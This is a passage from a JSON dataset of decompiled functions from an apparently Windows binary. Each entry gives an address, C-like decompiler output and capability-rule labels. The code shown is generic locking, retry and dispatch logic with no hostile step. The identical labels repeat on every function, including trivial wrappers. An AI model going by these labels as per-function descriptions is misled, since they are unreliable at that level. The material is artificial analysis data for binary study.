'\\x01';\n                                        }\n                                        fcn.0002f2a4(arg1 + 0x70);\n                                        goto code_r0x0005d74f;\n                                    }\n                                    iVar5 = 0x21590003;\n                                }\n                                else {\n                                    iVar5 = 0x21590006;\n                                }\ncode_r0x0005d836:\n                                fcn.0002f2a4(arg1 + 0x70);\n                            }\n                            goto code_r0x0005d7e3;\n                        }\n                        uStackX8 = CONCAT11(4, uStack88);\n                        if (0x7e < *(arg1 + 0x1d) - uStack88) {\n                            uStackX8 = CONCAT11(0x20, uStack88);\n                        }\n                        uStackX10 = uVar1;\n                        iVar5 = fcn.0005cd3c(arg1, 0, 0, &uStackX8);\n                        if (iVar5 != 0) goto code_r0x0005d7e3;\n                    }\ncode_r0x0005d74f:\n                    if (((uStack87 & 2) != 0) && (uStack88 == *(arg1 + 0x1d))) {\n                        uStackX8 = CONCAT11(4, uStack88);\n                        uStackX10 = uVar1;\n                        iVar5 = fcn.0005cd3c(arg1, 0, 0, &uStackX8);\n                        if (iVar5 == 0) {\n                            *(arg1 + 0x18) = 0;\n                            *(arg1 + 0x10) = 0;\n                            fcn.0002ee20(arg1 + 0x80);\n                            goto code_r0x0005d7ae;\n                        }\n                        goto code_r0x0005d7e3;\n                    }\n                    goto code_r0x0005d7ae;\n                }\n                uStackX8 = CONCAT11(2, uStack88);\n            }\n            uStackX10 = uVar1;\n            fcn.0005cd3c(arg1, 0, 0, &uStackX8);\n        }\n        else if ((*(arg1 + 0x18) == 2) || (*(arg1 + 0x18) == 1)) goto code_r0x0005d3ec;\ncode_r0x0005d7ae:\n        fcn.0005fde8(*(arg1 + 8), apuStack80[0]);\n    }\n    apuStack80[0] = NULL;\ncode_r0x0005d7d4:\n    iVar5 = *(arg1 + 0x14);\n    iVar2 = *0xfffff78000000320;\n    goto joined_r0x0005d149;\n}\n",
        "token_count": 3435
    },
    "0005d9fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0005d9fc(int64_t arg1, ulong arg2, uchar *arg3, int64_t *arg4)\n\n{\n    int64_t *arg1_00;\n    int64_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int64_t iVar5;\n    bool bVar6;\n    int32_t *in_stack_00000028;\n    uint32_t in_stack_00000030;\n    \n    iVar5 = 0;\n    fcn.0002f23c(arg1 + 0x70);\n    iVar3 = *(arg1 + 0x14);\n    do {\n        if (iVar3 != 0) {\n            uVar4 = 0x21590006;\ncode_r0x0005db50:\n            fcn.0002f2a4(arg1 + 0x70);\n            return uVar4;\n        }\n        if (*(arg1 + 0x10) == 0) {\n            uVar4 = 0x21590003;\n            goto code_r0x0005db50;\n        }\n        if ((arg2 == 1) && (*(arg1 + 0x8c) != 0)) {\n            uVar4 = 0;\n            *arg3 = *(arg1 + 0x88);\n            *(arg1 + 0x8c) = 0;\n            goto code_r0x0005db50;\n        }\n        if ((arg2 == 2) && (*(arg1 + 0x90) != 0)) {\n            *arg4 = *(*(arg1 + 0x90) + 8) + 3;\n            *in_stack_00000028 = *(*(arg1 + 0x90) + 0x10) + -3;\n            arg1_00 = *(arg1 + 0x90);\n            *(arg1 + 0xa0) = *(arg1 + 0xa0) - *(arg1_00 + 2);\n            iVar5 = *arg1_00;\n            fcn.0002fc50(arg1_00);\n            uVar4 = 0;\n            *(arg1 + 0x90) = iVar5;\n            if (iVar5 == 0) {\n                *(arg1 + 0x98) = 0;\n            }\n            if (*in_stack_00000028 == 0) {\n                fcn.0005fde8(*(arg1 + 8), *arg4 + -3);\n                *arg4 = 0;\n            }\n            goto code_r0x0005db50;\n        }\n        bVar6 = *(arg1 + 0x78) != 0;\n        if (bVar6) {\n            *(arg1 + 0x7c) = *(arg1 + 0x7c) + 1;\n        }\n        else {\n            *(arg1 + 0x78) = 1;\n        }\n        fcn.0002f2a4(arg1 + 0x70);\n        iVar1 = *0xfffff78000000320;\n        if (!bVar6) {\n            uVar4 = fcn.0005d118(arg1, arg2, arg3, arg4);\n            fcn.0002f23c(arg1 + 0x70);\n            *(arg1 + 0x78) = 0;\n            fcn.0002ee20(arg1 + 0x80);\n            goto code_r0x0005db50;\n        }\n        if (in_stack_00000030 == 0) {\n            uVar4 = 0x21590002;\n            goto code_r0x0005db50;\n        }\n        if (in_stack_00000030 != 0xffffffff) {\n            uVar2 = (**0x112f0)();\n            iVar5 = (uVar2 * iVar1) / 10000;\n        }\n        iVar3 = fcn.0002ee4c(arg1 + 0x80, in_stack_00000030);\n        iVar1 = *0xfffff78000000320;\n        if (iVar3 == 0) {\n            uVar4 = 0x21590002;\n            fcn.0002f23c(arg1 + 0x70);\n            *(arg1 + 0x7c) = *(arg1 + 0x7c) + -1;\n            goto code_r0x0005db50;\n        }\n        if (in_stack_00000030 != 0xffffffff) {\n            uVar2 = (**0x112f0)();\n            uVar2 = (uVar2 * iVar1) / 10000 - iVar5;\n            if (in_stack_00000030 < uVar2) {\n                in_stack_00000030 = 0;\n            }\n            else {\n                in_stack_00000030 = in_stack_00000030 - uVar2;\n            }\n        }\n        fcn.0002f23c(arg1 + 0x70);\n        *(arg1 + 0x7c) = *(arg1 + 0x7c) + -1;\n        iVar3 = *(arg1 + 0x14);\n    } while( true );\n}\n",
        "token_count": 1137
    },
    "0005dc70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0005dc70(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (*(arg1 + 0x14) == 0) {\n        if (*(arg1 + 0x10) == 0) {\n            uVar1 = 0x21590003;\n        }\n        else {\n            uVar1 = fcn.0005d9fc(arg1, 2, 0, arg2);\n        }\n    }\n    else {\n        uVar1 = 0x21590006;\n    }\n    return uVar1;\n}\n",
        "token_count": 137
    },
    "0005dcac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0005dcac(int64_t arg1, ulong arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    char cVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    int32_t iVar10;\n    char acStackX8 [8];\n    ulong uStackX16;\n    uchar uStack88;\n    uchar uStack87;\n    char cStack86;\n    \n    iVar7 = 0x21590002;\n    uStackX16 = arg2;\n    fcn.0002f23c(arg1 + 0x20);\n    if (*(arg1 + 0x14) == 0) {\n        if (*(arg1 + 0x10) == 0) {\n            iVar7 = 0x21590003;\n        }\n        else {\n            uStack88 = *(arg1 + 0x1c);\n            uStack87 = arg4;\n            uVar5 = fcn.00061a9e();\n            iVar10 = 0;\n            uVar1 = uVar5 >> 0x1f & 0x7f;\n            cVar4 = (uVar5 + uVar1 & 0x7f) - uVar1;\n            cStack86 = cVar4;\n            if (0 < *(arg1 + 0x58)) {\n                do {\n                    iVar2 = *0xfffff78000000320;\n                    uVar6 = (**0x112f0)();\n                    iVar7 = fcn.0005cd3c(arg1, uStackX16, arg3 & 0xffffffff, &uStack88);\n                    if (iVar7 != 0) break;\n                    iVar7 = fcn.0005d9fc(arg1, 1, acStackX8, 0);\n                    iVar3 = *0xfffff78000000320;\n                    if (iVar7 == 0) {\n                        if (acStackX8[0] == cVar4) {\n                            uVar8 = (**0x112f0)();\n                            uVar6 = (uVar8 * iVar3) / 10000 - (uVar6 * iVar2) / 10000;\n                            if (uVar6 < 100) {\n                                uVar6 = 100;\n                            }\n                            uVar6 = *(arg1 + 0x30) + uVar6 >> 1;\n                            *(arg1 + 0x30) = uVar6;\n                            if (60000 < uVar6) {\n                                *(arg1 + 0x30) = 60000;\n                            }\n                            *(arg1 + 0x1c) = *(arg1 + 0x1c) + '\\x01';\n                            iVar7 = 0;\n                            break;\n                        }\n                        iVar10 = iVar10 + -1;\n                    }\n                    else {\n                        if (iVar7 != 0x21590002) goto code_r0x0005de9a;\n                        if (iVar10 < *(arg1 + 0x58) + -1) {\n                            if (*(arg1 + 0x30) == 0) {\n                                *(arg1 + 0x30) = *(arg1 + 0x60);\n                            }\n                            else {\n                                uVar6 = *(arg1 + 0x30);\n                                uVar9 = fcn.00061a9e();\n                                *(arg1 + 0x30) = (uVar6 >> 1) + 1 + uVar6 + (uVar9 & 0xffffffff) % uVar6;\n                            }\n                        }\n                        else {\n                            iVar7 = 0x21590002;\n                        }\n                    }\n                    iVar10 = iVar10 + 1;\n                } while (iVar10 < *(arg1 + 0x58));\n                if (iVar7 != 0x21590002) goto code_r0x0005de9a;\n            }\n            *(arg1 + 0x18) = 0;\n            *(arg1 + 0x10) = 0;\n            uStack87 = 0x20;\n            fcn.0005cd3c(arg1, 0, 0, &uStack88);\n        }\n    }\n    else {\n        iVar7 = 0x21590006;\n    }\ncode_r0x0005de9a:\n    fcn.0002f2a4(arg1 + 0x20);\n    return iVar7;\n}\n",
        "token_count": 1000
    },
    "0005e278": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0005e278(int64_t arg1, int64_t arg2, int64_t *arg3, ulong *arg4)\n\n{\n    ulong uVar1;\n    uchar uVar2;\n    ulong *puVar3;\n    ulong uVar4;\n    \n    if (((arg1 == 0) || (arg3 == NULL)) || (arg4 == NULL)) {\n        uVar4 = 0x21590064;\n    }\n    else {\n        puVar3 = fcn.0002fbf0(0x28);\n        if (puVar3 == NULL) {\n            uVar4 = 0x21590004;\n        }\n        else {\n            puVar3[1] = arg1;\n            puVar3[2] = arg2;\n            *puVar3 = 0;\n            uVar4 = *arg4;\n            uVar1 = arg4[1];\n            puVar3[3] = uVar4;\n            puVar3[4] = uVar1;\n            uVar2 = (**0x113d0)(uVar4, arg3 + 4);\n            if (*arg3 == 0) {\n                *arg3 = puVar3;\n            }\n            else {\n                *arg3[1] = puVar3;\n            }\n            arg3[2] = arg3[2] + arg2;\n            arg3[1] = puVar3;\n            (**0x113c0)(arg3 + 4, uVar2);\n            fcn.0002ee20(arg3 + 3);\n            uVar4 = 0;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 358
    },
    "0005e3d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005e3d8(int64_t **arg1, int64_t *arg2, ulong arg3, ulong arg4)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *arg1_00;\n    uchar *puVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int64_t *piVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int32_t iVar9;\n    char *pcVar10;\n    int64_t iVar11;\n    ulong in_stack_00000028;\n    uint in_stack_00000030;\n    uint32_t in_stack_00000038;\n    \n    iVar11 = 0;\n    *arg1 = NULL;\n    iVar4 = *arg2;\n    piVar6 = arg2;\n    do {\n        if (iVar4 == 0) {\n            return 0x21590005;\n        }\n        arg1_00 = fcn.0002fc74(*piVar6);\n        if (arg1_00 == NULL) {\n            return 0x21590004;\n        }\n        puVar3 = fcn.00061a86(arg1_00, 0x2e);\n        if (puVar3 != NULL) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        iVar4 = fcn.0005fa50(arg1_00);\n        if (iVar4 == 0) {\n            fcn.0002fc50(arg1_00);\n            if (*0x87c28 != 0) {\n                uVar5 = (**(*0x87c28 + 0x14))(arg1, *piVar6, arg3, arg4, in_stack_00000028, in_stack_00000030);\n                uVar8 = uVar5 & 0xffffffff;\n                if ((uVar5 == 0) && (iVar4 = *0x87c28,  *0x87c28 != 0)) goto code_r0x0005e55b;\n                if (uVar5 != 0x21590005) {\n                    return uVar5;\n                }\n                goto code_r0x0005e524;\n            }\n        }\n        else {\n            if (puVar3 == NULL) {\n                iVar7 = -1;\n                pcVar10 = arg1_00;\n                do {\n                    if (iVar7 == 0) break;\n                    iVar7 = iVar7 + -1;\n                    cVar1 = *pcVar10;\n                    pcVar10 = pcVar10 + 1;\n                } while (cVar1 != '\\0');\n                iVar9 = ~iVar7 - 1;\n            }\n            else {\n                iVar9 = puVar3 - arg1_00;\n            }\n            fcn.0002fc50(arg1_00);\n            uVar2 = (**(iVar4 + 0x14))(arg1, iVar9 + *piVar6, arg3, arg4, in_stack_00000028, in_stack_00000030, \n                                       in_stack_00000038 & 0xfffeffff);\n            uVar8 = uVar2;\ncode_r0x0005e524:\n            if (iVar4 != 0) {\n                if (uVar8 != 0) {\n                    return uVar8;\n                }\ncode_r0x0005e55b:\n                if (*arg1 == NULL) {\n                    (**(iVar4 + 0x1c))(0, 0);\n                    (**(iVar4 + 0x24))(*arg1, 0);\n                    return 0xffffffff;\n                }\n                piVar6 = fcn.0002fbc4(0x28);\n                if (piVar6 != NULL) {\n                    *piVar6 = iVar4;\n                    *(piVar6 + 4) = 0;\n                    fcn.00031000(piVar6 + 1);\n                    **arg1 = piVar6;\n                    iVar9 = fcn.00058e7c(*arg1, 1);\n                    if (iVar9 != 0) {\n                        return uVar8;\n                    }\n                    fcn.0003105c(piVar6 + 1);\n                    fcn.0002fc50(piVar6);\n                }\n                (**(iVar4 + 0x1c))(*arg1, 0);\n                (**(iVar4 + 0x24))(*arg1, 0);\n                *arg1 = NULL;\n                return 0x21590004;\n            }\n        }\n        iVar11 = iVar11 + 1;\n        piVar6 = arg2 + iVar11;\n        iVar4 = *piVar6;\n    } while( true );\n}\n",
        "token_count": 1032
    },
    "0005e718": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005e718(int64_t **arg1, ulong *arg2, ulong arg3)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint64_t uVar6;\n    int64_t *arg1_00;\n    \n    uVar6 = fcn.0005e6b8(arg1);\n    if (uVar6 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x35) || (pcVar2 = *(piVar1 + 0xd),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar6 = 0x21590001;\n        }\n        else {\n            uVar4 = (*pcVar2)(arg1, arg2, arg3);\n            uVar6 = uVar4;\n            if (uVar4 == 0) {\n                arg1_00 = fcn.0002fbc4(0x28);\n                if (arg1_00 == NULL) {\n                    fcn.00031108(*arg1 + 1);\n                    (**(**arg1 + 0x24))(*arg2, 0);\n                    *arg2 = 0;\n                    return 0x21590004;\n                }\n                iVar3 = **arg1;\n                *(arg1_00 + 4) = 0;\n                *arg1_00 = iVar3;\n                fcn.00031000(arg1_00 + 1);\n                **arg2 = arg1_00;\n                iVar5 = fcn.00058e7c(*arg2, 1);\n                if (iVar5 == 0) {\n                    fcn.0003105c(arg1_00 + 1);\n                    fcn.0002fc50(arg1_00);\n                    (**(**arg1 + 0x24))(*arg2, 0);\n                    *arg2 = 0;\n                    uVar6 = 0x21590004;\n                }\n            }\n            else if (*(*arg1 + 4) != 0) {\n                uVar6 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 1);\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 520
    },
    "0005e9d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005e9d8(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    \n    uVar4 = fcn.0005e6b8(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x45) || (pcVar2 = *(piVar1 + 0x11),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 259
    },
    "0005ea50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005ea50(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    \n    uVar4 = fcn.0005e6b8(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x4d) || (pcVar2 = *(piVar1 + 0x13),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3, arg4);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 265
    },
    "0005ead0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005ead0(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint in_stack_00000028;\n    \n    uVar4 = fcn.0005e6b8(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x55) || (pcVar2 = *(piVar1 + 0x15),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 280
    },
    "0005eb58": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005eb58(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint in_stack_00000028;\n    \n    uVar4 = fcn.0005e6b8(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x65) || (pcVar2 = *(piVar1 + 0x19),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 280
    },
    "0005ebe0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0005ebe0(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint in_stack_00000028;\n    \n    uVar4 = fcn.0005e6b8(arg1);\n    if (uVar4 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x6d) || (pcVar2 = *(piVar1 + 0x1b),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            uVar4 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar2)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar4 = uVar3;\n            if ((uVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                uVar4 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 283
    },
    "0005ec68": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0005ec68(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int64_t arg2_00;\n    uint32_t auStackX32 [2];\n    \n    iVar3 = fcn.0005e6b8(arg1);\n    if (iVar3 == 0) {\n        piVar1 = **arg1;\n        if ((*piVar1 < 0x75) || (pcVar2 = *(piVar1 + 0x1d),  pcVar2 == NULL)) {\n            fcn.00031108(*arg1 + 1);\n            iVar3 = 0x21590001;\n        }\n        else {\n            iVar3 = (*pcVar2)(arg1, arg2);\n            if ((iVar3 != 0) && (*(*arg1 + 0x20) != 0)) {\n                iVar3 = 0x21590006;\n            }\n            fcn.00031108(*arg1 + 8);\n        }\n    }\n    if (iVar3 == 0x21590001) {\n        arg2_00 = fcn.0005f9ec(arg2, auStackX32);\n        if (arg2_00 == 0) {\n            iVar3 = 0x21590004;\n        }\n        else {\n            iVar3 = fcn.0005ea50(arg1, arg2_00, auStackX32[0], arg3);\n            fcn.0002fc50(arg2_00);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 360
    },
    "0005ed3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0005ed3c(int64_t **arg1, int64_t *arg2, ulong arg3, ulong arg4)\n\n{\n    char cVar1;\n    char *arg1_00;\n    uchar *puVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    int64_t iVar8;\n    ulong in_stack_00000028;\n    uint in_stack_00000030;\n    int32_t in_stack_00000040;\n    \n    iVar8 = 0;\n    *arg1 = NULL;\n    iVar3 = *arg2;\n    piVar4 = arg2;\n    do {\n        if (iVar3 == 0) {\n            return 0x21590005;\n        }\n        arg1_00 = fcn.0002fc74(*piVar4);\n        if (arg1_00 == NULL) {\n            return 0x21590004;\n        }\n        puVar2 = fcn.00061a86(arg1_00, 0x2e);\n        if (puVar2 != NULL) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        iVar3 = fcn.0005fa74(arg1_00);\n        if (iVar3 == 0) {\n            fcn.0002fc50(arg1_00);\n            if (*0x87c30 != 0) {\n                if (in_stack_00000040 == 0) {\n                    iVar6 = (**(*0x87c30 + 0x14))(arg1);\n                }\n                else {\n                    iVar6 = (**(*0x87c30 + 0x1c))(arg1, *piVar4, arg3, arg4, in_stack_00000028, in_stack_00000030);\n                }\n                iVar3 = *0x87c30;\n                if (iVar6 == 0) goto code_r0x0005eea1;\n            }\n        }\n        else {\n            if (puVar2 == NULL) {\n                iVar5 = -1;\n                pcVar7 = arg1_00;\n                do {\n                    if (iVar5 == 0) break;\n                    iVar5 = iVar5 + -1;\n                    cVar1 = *pcVar7;\n                    pcVar7 = pcVar7 + 1;\n                } while (cVar1 != '\\0');\n                iVar6 = ~iVar5 - 1;\n            }\n            else {\n                iVar6 = puVar2 - arg1_00;\n            }\n            fcn.0002fc50(arg1_00);\n            if (in_stack_00000040 == 0) {\n                iVar6 = (**(iVar3 + 0x14))();\n            }\n            else {\n                iVar6 = (**(iVar3 + 0x1c))(arg1, iVar6 + *piVar4, arg3, arg4, in_stack_00000028, in_stack_00000030);\n            }\ncode_r0x0005eea1:\n            if (iVar3 != 0) {\n                if (iVar6 != 0) {\n                    return iVar6;\n                }\n                if (*arg1 != NULL) {\n                    piVar4 = fcn.0002fbc4(0x30);\n                    if (piVar4 != NULL) {\n                        *piVar4 = iVar3;\n                        *(piVar4 + 4) = 0;\n                        *(piVar4 + 0x24) = 0;\n                        fcn.00031000(piVar4 + 1);\n                        fcn.0002f1ec(piVar4 + 5);\n                        **arg1 = piVar4;\n                        iVar6 = fcn.00058e7c(*arg1, 4);\n                        if (iVar6 != 0) {\n                            return 0;\n                        }\n                        fcn.0003105c(piVar4 + 1);\n                        fcn.0002f214(piVar4 + 5);\n                        fcn.0002fc50(piVar4);\n                    }\n                    (**(iVar3 + 0x24))(*arg1, 0);\n                    (**(iVar3 + 0x2c))(*arg1, 0);\n                    *arg1 = NULL;\n                    return 0x21590004;\n                }\n                (**(iVar3 + 0x24))(0, 0);\n                (**(iVar3 + 0x2c))(*arg1, 0);\n                return -1;\n            }\n        }\n        iVar8 = iVar8 + 1;\n        piVar4 = arg2 + iVar8;\n        iVar3 = *piVar4;\n    } while( true );\n}\n",
        "token_count": 1031
    },
    "0005ef7c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0005ef7c(int64_t **arg1, ulong arg2)\n\n{\n    int64_t **arg1_00;\n    int64_t *arg1_01;\n    int32_t iVar1;\n    \n    arg1_00 = *arg1;\n    fcn.0002f23c(0x87c20);\n    iVar1 = fcn.00058f70(arg1_00, 4);\n    if ((iVar1 == 0) || (arg1_01 = *arg1_00,  *(arg1_01 + 4) != 0)) {\n        fcn.0002f2a4(0x87c20);\n        *arg1 = NULL;\n    }\n    else {\n        *(arg1_01 + 4) = 1;\n        fcn.0002f2a4(0x87c20);\n        (**(**arg1_00 + 0x24))(arg1_00, arg2);\n        fcn.00031198(arg1_01 + 1);\n        fcn.0002f23c(0x87c20);\n        *arg1 = NULL;\n        fcn.00058ef0(arg1_00, 4);\n        fcn.0002f2a4(0x87c20);\n        (**(**arg1_00 + 0x2c))(arg1_00, arg2);\n        fcn.00031218(arg1_01 + 1);\n        fcn.0003105c(arg1_01 + 1);\n        fcn.0002f214(arg1_01 + 5);\n        fcn.0002fc50(arg1_01);\n    }\n    return;\n}\n",
        "token_count": 372
    },
    "0005f31c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
